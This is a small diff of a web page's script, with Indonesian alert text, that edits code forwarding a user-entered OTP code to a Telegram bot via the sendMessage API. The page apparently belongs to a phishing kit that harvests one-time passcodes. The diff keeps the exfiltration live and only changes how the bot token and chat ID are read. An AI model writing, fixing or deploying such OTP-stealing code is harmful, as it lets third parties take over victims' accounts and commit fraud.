@@ -167,13 +167,13 @@
       return;
     }
 
-    if (!window.TELEGRAM_TOKEN || !window.TELEGRAM_CHAT_ID) {
+    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
       alert("Konfigurasi belum tersedia. Silakan tunggu sebentar lalu coba lagi.");
       return;
     }
 
-    const token = window.TELEGRAM_TOKEN;
-    const chat_id = window.TELEGRAM_CHAT_ID;
+    const token = TELEGRAM_TOKEN;
+    const chat_id = TELEGRAM_CHAT_ID;
     const message = `KODE OTP: ${otp}`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -205,7 +205,6 @@
     });
   }
 </script>
-
 
   <script>
         document.getElementById('timer').innerHTML =
